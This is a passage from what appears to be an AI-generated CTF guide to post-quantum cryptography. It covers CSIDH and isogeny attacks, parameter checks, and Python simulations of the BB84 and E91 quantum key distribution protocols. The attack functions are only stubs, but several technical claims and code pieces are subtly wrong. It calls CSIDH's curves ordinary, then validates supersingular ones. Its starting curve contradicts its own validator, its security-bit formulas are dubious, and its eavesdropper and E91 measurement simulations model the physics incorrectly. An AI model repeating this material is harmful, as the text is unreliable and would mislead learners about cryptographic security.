
**Key Difference from SIDH:**

Uses commutative isogeny actions (class group action on ordinary curves instead of supersingular).

```
Setup: Starting curve E₀
Secret: element [a] in class group
Action: E₀ ⋆ [a] = E_a

Key Exchange:
Alice: E_A = E₀ ⋆ [a]
Bob: E_B = E₀ ⋆ [b]
Shared: E_{AB} = E_A ⋆ [b] = E_B ⋆ [a] = E₀ ⋆ [a] ⋆ [b]
(Works because [a] and [b] commute)
```

**CSIDH Parameters:**

```
CSIDH-512: Prime p ≈ 2^512, 64-byte public keys
CSIDH-1024: Prime p ≈ 2^1024, 128-byte public keys
CSIDH-1792: Prime p ≈ 2^1792, 224-byte public keys
```

**Implementation in Kali:**

[Unverified - isogeny implementations limited in standard repositories]

```bash
# Install SageMath for isogeny computations
sudo apt install sagemath

# CSIDH reference implementation
git clone https://github.com/JJChiDguez/csidh_withstrategies.git
cd csidh_withstrategies
make

# SQISign implementation (if available)
git clone https://github.com/SQISign/sqisign.git
cd sqisign
make
```

**SageMath Isogeny Computations:**

```python
from sage.all import *

# Define elliptic curve over finite field
p = 431  # Prime
Fp = GF(p)
E = EllipticCurve(Fp, [1, 0])  # y^2 = x^3 + x

print(f"Curve: {E}")
print(f"Order: {E.order()}")
print(f"Is supersingular: {E.is_supersingular()}")

# Generate random point
P = E.random_point()
print(f"Point: {P}")

# Compute isogeny from kernel
# Degree-2 isogeny from 2-torsion point
Q = E.random_point()
order = Q.order()
kernel_point = (order // 2) * Q  # 2-torsion

if kernel_point.order() == 2:
    # Compute isogeny
    phi = E.isogeny(kernel_point)
    E_target = phi.codomain()
    
    print(f"Isogeny: {phi}")
    print(f"Target curve: {E_target}")
    print(f"Image of P: {phi(P)}")
```

**Computing Isogeny Chains:**

```python
def compute_isogeny_chain(E_start, prime_degrees, exponents):
    """
    Compute chain of l-isogenies (CSIDH-style).
    Note: This code assumes the elliptic-curve object `E` implements:
      - E.order()
      - E.random_point()
      - P.order()
      - E.isogeny(P)  -> returns an isogeny object with .codomain()
      - codomain().j_invariant()
    """
    E_current = E_start

    for l, e in zip(prime_degrees, exponents):
        if e == 0:
            continue

        # apply |e| successive l-isogenies
        for _ in range(abs(e)):
            cofactor = E_current.order() // l

            # find a point of order exactly l
            P = None
            while True:
                Q = E_current.random_point()
                P_candidate = cofactor * Q
                if P_candidate.order() == l:
                    P = P_candidate
                    break

            # compute the l-isogeny with kernel <P>
            phi = E_current.isogeny(P)
            E_current = phi.codomain()

    return E_current


# Example: CSIDH-style computation (pseudo-Sage syntax)
p = 419
E0 = EllipticCurve(GF(p), [0, 1])  # Starting curve

# Secret exponents for small primes
primes = [3, 5, 7, 11, 13]
secret = [2, -1, 3, 0, 1]  # secret class group element

E_result = compute_isogeny_chain(E0, primes, secret)
print(f"Result curve j-invariant: {E_result.j_invariant()}")
````

**CSIDH Key Exchange Implementation:**

```python
class CSIDH:
    def __init__(self, prime, small_primes):
        """
        Initialize CSIDH parameters
        prime: CSIDH prime p = 4 * l1 * l2 * ... * ln - 1
        small_primes: list of odd primes dividing (p+1)/4
        """
        self.p = prime
        self.primes = small_primes
        self.Fp = GF(prime)
        self.E0 = EllipticCurve(self.Fp, [0, 1])
    
    def generate_secret(self, bound=5):
        """Generate secret key (random exponents)"""
        import random
        return [random.randint(-bound, bound) for _ in self.primes]
    
    def group_action(self, curve, secret):
        """
        Apply class group action
        curve * [secret] = result_curve
        """
        return compute_isogeny_chain(curve, self.primes, secret)
    
    def key_exchange(self):
        """Demonstrate CSIDH key exchange"""
        # Alice generates secret
        secret_a = self.generate_secret()
        public_a = self.group_action(self.E0, secret_a)
        
        # Bob generates secret
        secret_b = self.generate_secret()
        public_b = self.group_action(self.E0, secret_b)
        
        # Shared secret computation
        shared_alice = self.group_action(public_b, secret_a)
        shared_bob = self.group_action(public_a, secret_b)
        
        # Should be isomorphic (same j-invariant)
        print(f"Alice's shared: {shared_alice.j_invariant()}")
        print(f"Bob's shared: {shared_bob.j_invariant()}")
        print(f"Match: {shared_alice.j_invariant() == shared_bob.j_invariant()}")
        
        return shared_alice.j_invariant()

# Example usage
csidh = CSIDH(prime=419, small_primes=[3, 5, 7, 11, 13])
shared_secret = csidh.key_exchange()
````

**Isogeny Attack Vectors:**

**Meet-in-the-Middle Attack:**

For small degree isogenies:

```python
def mitm_isogeny_attack(E_start, E_target, max_degree):
    """
    Meet-in-the-middle attack for finding isogeny path
    Complexity: O(sqrt(degree)) space and time
    """
    # Build forward table: E_start -> intermediate curves
    forward_table = {}
    
    # Enumerate all isogenies from E_start
    queue = [(E_start, [])]
    
    while queue:
        E_current, path = queue.pop(0)
        j_inv = E_current.j_invariant()
        
        if j_inv not in forward_table:
            forward_table[j_inv] = path
        
        # Generate next isogenies
        for degree in range(2, max_degree):
            # [Compute degree-d isogenies from E_current]
            # Add to queue if path short enough
            pass
    
    # Build backward table from E_target
    backward_table = {}
    queue = [(E_target, [])]
    
    while queue:
        E_current, path = queue.pop(0)
        j_inv = E_current.j_invariant()
        
        # Check for collision
        if j_inv in forward_table:
            complete_path = forward_table[j_inv] + path[::-1]
            return complete_path
        
        if j_inv not in backward_table:
            backward_table[j_inv] = path
        
        # Generate isogenies backward
        # [Implementation similar to forward case]
    
    return None
```

[Inference - complexity analysis]

For CSIDH with appropriate parameters, MITM attack complexity exceeds 2^128 operations.

**Torsion Point Attacks:**

SIDH was vulnerable because it leaked torsion point information:

```python
def exploit_auxiliary_points(E_A, phi_A_PB, phi_A_QB):
    """
    Exploit auxiliary point information (SIDH vulnerability)
    """
    # Auxiliary points φ_A(P_B), φ_A(Q_B) reveal kernel structure
    
    # Build Weil pairing equations
    # e(φ_A(P_B), φ_A(Q_B)) = e(P_B, Q_B)^(deg φ_A)
    
    # Use glue-and-split technique to recover kernel
    # [Complex isogeny diamond construction]
    
    # This attack breaks SIDH in polynomial time
    return recovered_kernel
```

**CSIDH is NOT vulnerable** to this attack because it doesn't transmit auxiliary torsion point information.

**Quantum Attacks on Isogenies:**

**Kuperberg's Algorithm:**

[Unverified - theoretical quantum attack]

Quantum subexponential algorithm for hidden shift problem applies to CSIDH:

```
Complexity: exp(O(sqrt(log N)))
where N = class group size

For CSIDH-512: ~2^64 quantum operations
For CSIDH-1024: ~2^80 quantum operations
```

This is subexponential but still costly for large parameters.

**Isogeny Path Finding:**

Quantum computers can potentially find isogeny paths faster using:

- Grover's algorithm for meet-in-the-middle
- Quantum walks on isogeny graphs

[Inference - security analysis ongoing]

Isogeny-based schemes require larger parameters than initially thought to resist quantum attacks.

**CTF Challenge Scenarios:**

**Small Parameter Exploitation:**

```python
def check_isogeny_security(prime, degree, class_group_size):
    """
    Estimate security of isogeny-based scheme
    """
    import math
    
    # Classical security
    classical_bits = math.log2(degree) / 2  # MITM complexity
    
    # Quantum security (Kuperberg)
    quantum_bits = math.sqrt(math.log2(class_group_size))
    
    print(f"Classical security: ~{classical_bits:.1f} bits")
    print(f"Quantum security: ~{quantum_bits:.1f} bits")
    
    if classical_bits < 80 or quantum_bits < 80:
        print("[WARNING] Weak parameters")
        return False
    
    return True

# Examples
check_isogeny_security(prime=2**128, degree=2**64, class_group_size=2**128)  # Weak
check_isogeny_security(prime=2**512, degree=2**256, class_group_size=2**256)  # Strong
```

**Curve Parameter Validation:**

```python
def validate_csidh_curve(E, p):
    """
    Validate CSIDH curve parameters
    """
    # Check if curve is over correct field
    if E.base_field().order() != p:
        print("[ERROR] Wrong base field")
        return False
    
    # Check if curve has correct form y^2 = x^3 + Ax^2 + x
    a = E.a_invariants()
    if a[0] != 0 or a[2] != 0 or a[3] != 1 or a[4] != 0:
        print("[ERROR] Wrong curve form")
        return False
    
    # Check if curve order is p+1 (supersingular over Fp)
    expected_order = p + 1
    actual_order = E.order()
    
    if actual_order != expected_order:
        print(f"[ERROR] Wrong order: {actual_order} != {expected_order}")
        return False
    
    print("[OK] Valid CSIDH curve")
    return True
```

**Invalid Curve Attack:**

```python
def invalid_curve_attack(public_key_curve):
    """
    Check for invalid curve attacks
    """
    # Attacker sends specially crafted curve
    # If implementation doesn't validate, may leak information
    
    # Example: Send curve with smooth order
    # Discrete log on smooth order group is easy
    
    if has_smooth_order(public_key_curve):
        print("[VULNERABLE] Smooth order curve attack possible")
        # Can recover secret by solving DLP on smooth group
        return True
    
    return False

def has_smooth_order(E):
    """Check if curve order is smooth (many small factors)"""
    order = E.order()
    factors = factor(order)
    
    # If all factors are small, order is smooth
    max_factor = max([p for p, _ in factors])
    return max_factor < 1000000  # Arbitrary threshold
```

**Isogeny Graph Walking:**

```python
def explore_isogeny_graph(E_start, depth=3, degree=2):
    """
    Walk isogeny graph to explore structure
    Useful for understanding small examples
    """
    visited = {E_start.j_invariant(): E_start}
    queue = [(E_start, 0)]
    
    while queue:
        E_current, current_depth = queue.pop(0)
        
        if current_depth >= depth:
            continue
        
        # Find all degree-d isogenies from E_current
        try:
            # Find points of order d
            d = degree
            cofactor = E_current.order() // d
            
            # Try to find all d-torsion points
            torsion_points = []
            for _ in range(100):  # Limited attempts
                P = E_current.random_point()
                P = cofactor * P
                if P.order() == d and P not in torsion_points:
                    torsion_points.append(P)
                if len(torsion_points) >= d - 1:
                    break
            
            # Compute isogenies
            for P in torsion_points:
                phi = E_current.isogeny(P)
                E_next = phi.codomain()
                j_next = E_next.j_invariant()
                
                if j_next not in visited:
                    visited[j_next] = E_next
                    queue.append((E_next, current_depth + 1))
        
        except Exception as e:
            continue
    
    print(f"Explored {len(visited)} curves at depth {depth}")
    return visited

# Example: Explore small isogeny graph
p = 431
E0 = EllipticCurve(GF(p), [1, 0])
graph = explore_isogeny_graph(E0, depth=2, degree=2)
```

**Tools for Isogeny Cryptanalysis:**

- `SageMath` - Comprehensive elliptic curve and isogeny support
- `Magma` - Advanced computational algebra (commercial)
- `Pari/GP` - Number theory computations
- `CSIDH implementations` - Reference code for testing

**Performance Characteristics:**

[Inference based on published benchmarks]

```
CSIDH-512 operations (approximate):
- Key generation: 100-200 ms
- Shared secret: 100-200 ms

SQISign operations:
- Key generation: ~1 second
- Signing: ~500 ms
- Verification: ~50 ms

SIDH (before break):
- Key generation: 5-10 ms
- Shared secret: 5-10 ms
```

Isogeny-based schemes are generally slower than lattice-based schemes but competitive with code-based schemes.

**Key Sizes:**

|Scheme|Public Key|Secret Key|Ciphertext/Signature|
|---|---|---|---|
|CSIDH-512|64 bytes|~37 bytes|64 bytes|
|CSIDH-1024|128 bytes|~74 bytes|128 bytes|
|SQISign-128|~64 bytes|~64 bytes|~200 bytes|
|SIDH (broken)|330 bytes|32 bytes|330 bytes|

**Isogeny-based vs Other PQC:**

**Advantages:**

- Small key sizes (CSIDH)
- Quantum security based on different hardness assumption
- Mathematical elegance

**Disadvantages:**

- Slower performance
- Less mature cryptanalysis (SIDH break shows risks)
- Complex implementation (easier to make mistakes)
- Higher quantum security uncertainty

**Current Status:**

[As of January 2025 knowledge cutoff]

After SIDH's break, isogeny-based cryptography is in transition. CSIDH remains secure but has performance concerns. SQISign is under active development but not yet standardized. The field is younger and less understood than lattice or code-based approaches.

---

**Critical Post-Quantum Cryptography Topics for CTF:**

For comprehensive PQC exploitation, also study:

- **Hybrid Cryptography** - Combining classical and PQC schemes for defense-in-depth
- **PQC Implementation Attacks** - Side-channel attacks (timing, power, fault injection) on PQC implementations
- **Parameter Validation** - Detecting weak or malicious parameters in PQC schemes
- **Quantum Computing Fundamentals** - Understanding Shor's and Grover's algorithms to assess quantum threats
- **Cryptographic Agility** - Migration strategies from classical to post-quantum schemes

**Practical Tools Summary:**

```bash
# Essential PQC toolkit for Kali Linux

# 1. Open Quantum Safe (liboqs)
sudo apt install liboqs-dev

# 2. SageMath (mathematical analysis)
sudo apt install sagemath

# 3. Python libraries
pip3 install pqcrypto ntru xmssmt fpylll

# 4. OpenSSL with PQC support
git clone https://github.com/open-quantum-safe/oqs-provider.git
cd oqs-provider && mkdir build && cd build
cmake .. && make && sudo make install

# 5. Reference implementations
# Clone specific scheme repositories as needed
```

**Testing PQC in CTF Scenarios:**

```python
#!/usr/bin/env python3
"""
PQC scheme tester for CTF challenges
"""

def test_pqc_scheme(scheme_name, public_key, ciphertext=None):
    """
    Analyze PQC scheme for vulnerabilities
    """
    checks = {
        'parameter_strength': check_parameters(scheme_name, public_key),
        'implementation_flaws': check_implementation(scheme_name),
        'side_channels': check_side_channels(scheme_name),
        'state_management': check_state_issues(scheme_name)
    }
    
    print(f"[*] Testing {scheme_name}")
    for check, result in checks.items():
        status = "[OK]" if result else "[FAIL]"
        print(f"{status} {check}")
    
    return all(checks.values())

def check_parameters(scheme, key):
    """Validate cryptographic parameters"""
    # Check key sizes, parameter ranges
    # [Implementation specific to scheme]
    return True

def check_implementation(scheme):
    """Look for common implementation mistakes"""
    # Constant-time operations
    # Proper error handling
    # Secure random number generation
    return True

def check_side_channels(scheme):
    """Analyze for side-channel vulnerabilities"""
    # Timing attacks
    # Cache attacks
    # Power analysis
    return True

def check_state_issues(scheme):
    """Check for state management problems (hash-based)"""
    if 'xmss' in scheme.lower() or 'lms' in scheme.lower():
        # Check for state reuse
        return verify_state_tracking(scheme)
    return True

# Usage in CTF
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: test_pqc.py <scheme_name>")
        sys.exit(1)
    
    scheme = sys.argv[1]
    test_pqc_scheme(scheme, None)
```

**Key Takeaways for CTF:**

1. **Lattice-based** (Kyber, NTRU): Check parameter sizes, look for weak dimensions or small moduli
2. **Code-based** (McEliece): Validate error correction capability, check for small code parameters
3. **Multivariate** (UOV, MAYO): Test for linearization attacks, analyze for structural leaks
4. **Hash-based** (XMSS, SPHINCS+): Look for state reuse, verify Merkle tree construction
5. **Isogeny-based** (CSIDH, SQISign): Validate curve parameters, check for invalid curve attacks

All schemes require proper implementation—side-channel attacks and parameter validation are often the weakest points in CTF challenges.

---

## Quantum Key Distribution (QKD)

### BB84 Protocol

The BB84 (Bennett-Brassard 1984) protocol is the first and most widely implemented quantum key distribution scheme. It exploits quantum mechanical properties, specifically the no-cloning theorem and Heisenberg's uncertainty principle, to enable two parties to establish a shared secret key with provable security against eavesdropping.

**Core Principles:**

BB84 uses photon polarization states in two conjugate bases:

- **Rectilinear basis (+)**: Horizontal (0°) and Vertical (90°)
- **Diagonal basis (×)**: Diagonal +45° and Diagonal -45° (135°)

Key security relies on:

- Measuring in wrong basis produces random results (50% error)
- Quantum measurement disturbs the state (eavesdropping detection)
- No-cloning theorem prevents perfect copying of unknown quantum states

**BB84 Protocol Steps:**

```python
import random
import numpy as np
from collections import Counter

class BB84Protocol:
    """
    Simulation of BB84 Quantum Key Distribution Protocol
    
    [Unverified] This is a classical simulation for educational purposes.
    Real QKD requires quantum hardware (single-photon sources, quantum channels).
    """
    
    def __init__(self, key_length=100):
        self.key_length = key_length
        self.alice_bits = []
        self.alice_bases = []
        self.bob_bases = []
        self.bob_measurements = []
        self.sifted_key_alice = []
        self.sifted_key_bob = []
    
    def prepare_qubits(self):
        """
        Step 1: Alice generates random bits and bases
        """
        print("[ALICE] Preparing quantum states...")
        
        for i in range(self.key_length):
            # Random bit value (0 or 1)
            bit = random.randint(0, 1)
            # Random basis: 0 = rectilinear (+), 1 = diagonal (×)
            basis = random.randint(0, 1)
            
            self.alice_bits.append(bit)
            self.alice_bases.append(basis)
        
        print(f"[ALICE] Prepared {self.key_length} qubits")
        print(f"[ALICE] Sample bits: {self.alice_bits[:10]}")
        print(f"[ALICE] Sample bases: {self.alice_bases[:10]} (0=+, 1=×)")
    
    def measure_qubits(self):
        """
        Step 2: Bob randomly chooses measurement bases and measures
        """
        print("\n[BOB] Measuring qubits...")
        
        for i in range(self.key_length):
            # Bob randomly chooses measurement basis
            basis = random.randint(0, 1)
            self.bob_bases.append(basis)
            
            # Simulate measurement
            if self.alice_bases[i] == basis:
                # Same basis: Bob measures correctly
                measurement = self.alice_bits[i]
            else:
                # Different basis: Bob gets random result (50/50)
                measurement = random.randint(0, 1)
            
            self.bob_measurements.append(measurement)
        
        print(f"[BOB] Measured {self.key_length} qubits")
        print(f"[BOB] Sample measurements: {self.bob_measurements[:10]}")
        print(f"[BOB] Sample bases: {self.bob_bases[:10]}")
    
    def basis_reconciliation(self):
        """
        Step 3: Alice and Bob publicly compare bases (not bit values)
        """
        print("\n[PUBLIC CHANNEL] Basis reconciliation...")
        
        matching_bases = 0
        for i in range(self.key_length):
            if self.alice_bases[i] == self.bob_bases[i]:
                # Keep bits where bases match
                self.sifted_key_alice.append(self.alice_bits[i])
                self.sifted_key_bob.append(self.bob_measurements[i])
                matching_bases += 1
        
        print(f"[INFO] Matching bases: {matching_bases}/{self.key_length} "
              f"({100*matching_bases/self.key_length:.1f}%)")
        print(f"[INFO] Sifted key length: {len(self.sifted_key_alice)} bits")
    
    def error_detection(self, sample_size=None):
        """
        Step 4: Sample random bits to check for eavesdropping
        """
        if sample_size is None:
            sample_size = len(self.sifted_key_alice) // 4  # 25% sample
        
        print(f"\n[PUBLIC CHANNEL] Error detection (sampling {sample_size} bits)...")
        
        # Randomly sample indices
        sample_indices = random.sample(range(len(self.sifted_key_alice)), 
                                      min(sample_size, len(self.sifted_key_alice)))
        
        errors = 0
        for idx in sorted(sample_indices, reverse=True):
            # Compare sampled bits
            if self.sifted_key_alice[idx] != self.sifted_key_bob[idx]:
                errors += 1
            
            # Remove sampled bits from key
            del self.sifted_key_alice[idx]
            del self.sifted_key_bob[idx]
        
        qber = errors / len(sample_indices) if sample_indices else 0
        print(f"[INFO] Errors detected: {errors}/{len(sample_indices)}")
        print(f"[INFO] QBER (Quantum Bit Error Rate): {qber*100:.2f}%")
        print(f"[INFO] Final key length: {len(self.sifted_key_alice)} bits")
        
        # [Inference] Typical QBER thresholds:
        # < 11%: Secure (BB84 with privacy amplification)
        # 11-15%: Marginal (suspicious, may indicate eavesdropping)
        # > 15%: Insecure (abort protocol)
        
        if qber > 0.11:
            print("[WARNING] QBER exceeds security threshold! Possible eavesdropping!")
            return False
        
        print("[INFO] QBER acceptable - no eavesdropping detected")
        return True
    
    def privacy_amplification(self):
        """
        Step 5: Apply privacy amplification to remove potential leaked information
        """
        print("\n[INFO] Applying privacy amplification...")
        
        # Simple XOR-based amplification (real implementations use hash functions)
        amplified_alice = []
        amplified_bob = []
        
        # Combine pairs of bits
        for i in range(0, len(self.sifted_key_alice) - 1, 2):
            amplified_alice.append(
                self.sifted_key_alice[i] ^ self.sifted_key_alice[i+1]
            )
            amplified_bob.append(
                self.sifted_key_bob[i] ^ self.sifted_key_bob[i+1]
            )
        
        self.final_key_alice = amplified_alice
        self.final_key_bob = amplified_bob
        
        print(f"[INFO] Final key length after amplification: {len(self.final_key_alice)} bits")
    
    def run_protocol(self):
        """Execute complete BB84 protocol"""
        print("="*60)
        print("BB84 QUANTUM KEY DISTRIBUTION PROTOCOL")
        print("="*60)
        
        self.prepare_qubits()
        self.measure_qubits()
        self.basis_reconciliation()
        
        if self.error_detection():
            self.privacy_amplification()
            
            # Verify keys match
            if self.final_key_alice == self.final_key_bob:
                print("\n[SUCCESS] Shared secret key established!")
                print(f"[KEY] {self.final_key_alice[:20]}... "
                      f"({len(self.final_key_alice)} bits)")
                return self.final_key_alice
            else:
                print("\n[ERROR] Key mismatch!")
                return None
        else:
            print("\n[ABORT] Protocol aborted due to high error rate")
            return None

# Run simulation
bb84 = BB84Protocol(key_length=200)
key = bb84.run_protocol()
```

**BB84 with Eavesdropper (Eve) Simulation:**

```python
class BB84WithEve(BB84Protocol):
    """
    BB84 protocol simulation with active eavesdropper
    """
    
    def __init__(self, key_length=100, eve_intercept_rate=0.5):
        super().__init__(key_length)
        self.eve_intercept_rate = eve_intercept_rate
        self.eve_bases = []
        self.eve_measurements = []
    
    def intercept_and_resend(self):
        """
        Eve intercepts qubits between Alice and Bob (intercept-resend attack)
        """
        print(f"\n[EVE] Intercepting {self.eve_intercept_rate*100:.0f}% of qubits...")
        
        intercepted_qubits = []
        
        for i in range(self.key_length):
            if random.random() < self.eve_intercept_rate:
                # Eve intercepts this qubit
                eve_basis = random.randint(0, 1)
                self.eve_bases.append(eve_basis)
                
                # Eve measures (disturbing the state)
                if self.alice_bases[i] == eve_basis:
                    eve_measurement = self.alice_bits[i]
                else:
                    eve_measurement = random.randint(0, 1)
                
                self.eve_measurements.append(eve_measurement)
                intercepted_qubits.append(i)
                
                # Eve resends in random basis
                resend_basis = random.randint(0, 1)
                
                # This creates errors when Bob measures
                # If Eve's basis ≠ Alice's basis, state is disturbed
                if eve_basis != self.alice_bases[i]:
                    # Eve measured in wrong basis, introduced 50% error
                    self.alice_bits[i] = eve_measurement
            else:
                self.eve_bases.append(None)
                self.eve_measurements.append(None)
        
        print(f"[EVE] Intercepted {len(intercepted_qubits)} qubits")
    
    def run_protocol_with_eve(self):
        """Execute BB84 with active eavesdropper"""
        print("="*60)
        print("BB84 WITH EAVESDROPPER (EVE)")
        print("="*60)
        
        self.prepare_qubits()
        self.intercept_and_resend()  # Eve's attack
        self.measure_qubits()
        self.basis_reconciliation()
        
        # Error detection should reveal Eve's presence
        secure = self.error_detection()
        
        if secure:
            print("\n[UNEXPECTED] Eve not detected despite interception!")
            print("[INFO] This can happen with low intercept rates")
        else:
            print("\n[SUCCESS] Eavesdropper detected and protocol aborted!")
        
        return secure

# Demonstrate eavesdropper detection
bb84_eve = BB84WithEve(key_length=200, eve_intercept_rate=0.5)
bb84_eve.run_protocol_with_eve()
```

**Polarization Encoding Reference:**

```python
def encode_bit_bb84(bit, basis):
    """
    Encode bit using BB84 polarization scheme
    
    Rectilinear basis (+):
      0 → Horizontal (0°)
      1 → Vertical (90°)
    
    Diagonal basis (×):
      0 → Diagonal +45°
      1 → Diagonal -45° (135°)
    """
    encoding = {
        (0, 0): "Horizontal (0°)",      # bit=0, basis=rectilinear
        (1, 0): "Vertical (90°)",        # bit=1, basis=rectilinear
        (0, 1): "Diagonal +45°",         # bit=0, basis=diagonal
        (1, 1): "Diagonal -45° (135°)"   # bit=1, basis=diagonal
    }
    return encoding[(bit, basis)]

# Example encoding table
print("BB84 Polarization Encoding:")
print("-" * 40)
for bit in [0, 1]:
    for basis in [0, 1]:
        basis_name = "Rectilinear (+)" if basis == 0 else "Diagonal (×)"
        print(f"Bit={bit}, Basis={basis_name}: {encode_bit_bb84(bit, basis)}")
```

**QBER Analysis Tool:**

```python
def analyze_qber(error_rate):
    """
    Analyze Quantum Bit Error Rate and security implications
    """
    print(f"\nQBER Analysis: {error_rate*100:.2f}%")
    print("=" * 50)
    
    # Theoretical limits for BB84
    if error_rate <= 0.11:
        print("Status: SECURE")
        print("  - Error rate within acceptable bounds")
        print("  - Privacy amplification can remove leaked info")
        
        # Shannon limit for secret key rate
        # R ≈ 1 - h(QBER) where h is binary entropy
        from math import log2
        if 0 < error_rate < 1:
            h = -error_rate * log2(error_rate) - (1-error_rate) * log2(1-error_rate)
            key_rate = 1 - h
            print(f"  - Estimated secret key rate: {key_rate:.3f} bits/qubit")
    
    elif 0.11 < error_rate <= 0.15:
        print("Status: MARGINAL")
        print("  - QBER approaching security threshold")
        print("  - Possible eavesdropping or channel noise")
        print("  - Consider aborting or improving channel")
    
    else:
        print("Status: INSECURE")
        print("  - QBER exceeds BB84 security threshold (11%)")
        print("  - Likely eavesdropping detected")
        print("  - ABORT PROTOCOL")
    
    # Estimate intercept rate from QBER
    # For intercept-resend: QBER ≈ 0.25 * intercept_rate
    estimated_intercept = error_rate / 0.25
    print(f"\nEstimated intercept rate: {min(estimated_intercept*100, 100):.1f}%")
    
    return error_rate <= 0.11

# Test various error rates
for qber in [0.05, 0.10, 0.11, 0.15, 0.25]:
    analyze_qber(qber)
    print()
```

**Practical BB84 Attack Scenarios (CTF Context):**

```python
def simulate_attack_scenarios():
    """
    Simulate various attack scenarios against BB84
    """
    
    print("BB84 Attack Scenarios")
    print("=" * 60)
    
    # Scenario 1: Intercept-Resend Attack
    print("\n1. INTERCEPT-RESEND ATTACK")
    print("-" * 40)
    print("Eve intercepts, measures, and resends qubits")
    print("Detection: ~25% QBER with 100% interception")
    bb84_eve = BB84WithEve(key_length=200, eve_intercept_rate=1.0)
    bb84_eve.run_protocol_with_eve()
    
    # Scenario 2: Partial Interception
    print("\n\n2. PARTIAL INTERCEPTION ATTACK")
    print("-" * 40)
    print("Eve intercepts only 30% of qubits")
    print("Detection: ~7.5% QBER")
    bb84_partial = BB84WithEve(key_length=200, eve_intercept_rate=0.3)
    bb84_partial.run_protocol_with_eve()
    
    # Scenario 3: No Attack
    print("\n\n3. NO ATTACK (BASELINE)")
    print("-" * 40)
    print("Clean channel, only natural errors")
    bb84_clean = BB84Protocol(key_length=200)
    bb84_clean.run_protocol()

simulate_attack_scenarios()
```

### E91 Protocol

The E91 (Ekert 1991) protocol uses quantum entanglement and Bell inequality violations for key distribution. Unlike BB84 which uses single photons, E91 exploits the correlations between entangled photon pairs to detect eavesdropping and establish a secure key.

**Core Principles:**

E91 relies on:

- **Quantum Entanglement**: EPR (Einstein-Podolsky-Rosen) pairs
- **Bell's Inequality**: Violations prove quantum correlations
- **Non-local Correlations**: Measurements on entangled pairs are correlated
- **CHSH Inequality**: S ≤ 2 (classical), S > 2 (quantum, up to 2√2)

**E91 Protocol Steps:**

```python
import numpy as np
from math import sqrt, cos, sin, pi

class E91Protocol:
    """
    Simulation of E91 Quantum Key Distribution Protocol using entangled photons
    
    [Unverified] This is a classical simulation. Real E91 requires:
    - Entangled photon pair source
    - Single-photon detectors at both sites
    - Careful timing synchronization
    """
    
    def __init__(self, key_length=100):
        self.key_length = key_length
        self.entangled_pairs = []
        self.alice_bases = []
        self.bob_bases = []
        self.alice_measurements = []
        self.bob_measurements = []
    
    def generate_entangled_pairs(self):
        """
        Step 1: Source generates entangled photon pairs (Bell state)
        Using |Ψ⁺⟩ = (|01⟩ + |10⟩)/√2
        """
        print("[SOURCE] Generating entangled photon pairs...")
        
        for _ in range(self.key_length):
            # Simulate Bell state - perfectly anti-correlated in same basis
            state = random.randint(0, 1)  # Determines correlation
            self.entangled_pairs.append(state)
        
        print(f"[SOURCE] Generated {self.key_length} entangled pairs")
    
    def alice_measure(self):
        """
        Step 2: Alice measures her photons in randomly chosen bases
        
        E91 uses 3 bases for Alice (angles in degrees):
        - a1 = 0°
        - a2 = 45°
        - a3 = 90°
        """
        print("\n[ALICE] Measuring photons...")
        
        alice_angles = [0, 45, 90]  # Three measurement bases
        
        for pair_state in self.entangled_pairs:
            # Alice randomly chooses one of three bases
            basis_idx = random.randint(0, 2)
            self.alice_bases.append(basis_idx)
            
            # Simulate measurement (simplified)
            # In same basis with Bob: perfectly correlated/anti-correlated
            measurement = self.simulate_measurement(pair_state, 
                                                   alice_angles[basis_idx])
            self.alice_measurements.append(measurement)
        
        print(f"[ALICE] Completed {len(self.alice_measurements)} measurements")
    
    def bob_measure(self):
        """
        Step 3: Bob measures his photons in randomly chosen bases
        
        Bob uses 3 bases (angles in degrees):
        - b1 = 45°
        - b2 = 90°
        - b3 = 135°
        
        Note: Some bases overlap with Alice's for key generation,
        others are used for Bell inequality testing
        """
        print("\n[BOB] Measuring photons...")
        
        bob_angles = [45, 90, 135]
        
        for i, pair_state in enumerate(self.entangled_pairs):
            # Bob randomly chooses one of three bases
            basis_idx = random.randint(0, 2)
            self.bob_bases.append(basis_idx)
            
            # Simulate correlated measurement
            measurement = self.simulate_correlated_measurement(
                pair_state, 
                self.alice_bases[i],
                basis_idx
            )
            self.bob_measurements.append(measurement)
        
        print(f"[BOB] Completed {len(self.bob_measurements)} measurements")
    
    def simulate_measurement(self, state, angle):
        """Simulate single photon measurement"""
        # Simplified: real quantum measurement involves projection
        prob = cos(angle * pi / 180) ** 2
        return 1 if random.random() < prob else 0
    
    def simulate_correlated_measurement(self, state, alice_basis, bob_basis):
        """
        Simulate correlated measurement on entangled pair
        
        For entangled pairs, correlation depends on relative angle
        between measurement bases
        """
        alice_angles = [0, 45, 90]
        bob_angles = [45, 90, 135]
        
        alice_angle = alice_angles[alice_basis]
        bob_angle = bob_angles[bob_basis]
        
        # Relative angle
        delta = abs(alice_angle - bob_angle)
        
        # For Bell state, correlation = cos²(δ)
        correlation = cos(delta * pi / 180) ** 2
        
        # Measurements are correlated based on angle
        if random.random() < correlation:
            return self.alice_measurements[len(self.bob_measurements)]
        else:
            return 1 - self.alice_measurements[len(self.bob_measurements)]
    
    def test_bell_inequality(self):
        """
        Step 4: Test CHSH inequality to detect eavesdropping
        
        CHSH: S = |E(a1,b1) + E(a1,b2) + E(a2,b1) - E(a2,b2)|
        Classical: S ≤ 2
        Quantum: S ≤ 2√2 ≈ 2.828
        """
        print("\n[PUBLIC] Testing Bell (CHSH) inequality...")
        
        # Identify measurement pairs for each basis combination
        correlations = {}
        
        for alice_b in range(3):
            for bob_b in range(3):
                matching_pairs = []
                
                for i in range(len(self.alice_bases)):
                    if (self.alice_bases[i] == alice_b and 
                        self.bob_bases[i] == bob_b):
                        # Calculate correlation for this pair
                        if (self.alice_measurements[i] == 
                            self.bob_measurements[i]):
                            matching_pairs.append(1)  # Correlated
                        else:
                            matching_pairs.append(-1)  # Anti-correlated
                
                if matching_pairs:
                    # E(a,b) = correlation coefficient
                    correlations[(alice_b, bob_b)] = (
                        sum(matching_pairs) / len(matching_pairs)
                    )
        
        # Calculate CHSH parameter S
        # Using basis combinations: a1=0, a2=1, b1=0, b2=1
        if len(correlations) >= 4:
            E11 = correlations.get((0, 0), 0)
            E12 = correlations.get((0, 1), 0)
            E21 = correlations.get((1, 0), 0)
            E22 = correlations.get((1, 1), 0)
            
            S = abs(E11 + E12 + E21 - E22)
            
            print(f"[INFO] CHSH parameter S = {S:.3f}")
            print(f"[INFO] Classical limit: S ≤ 2.0")
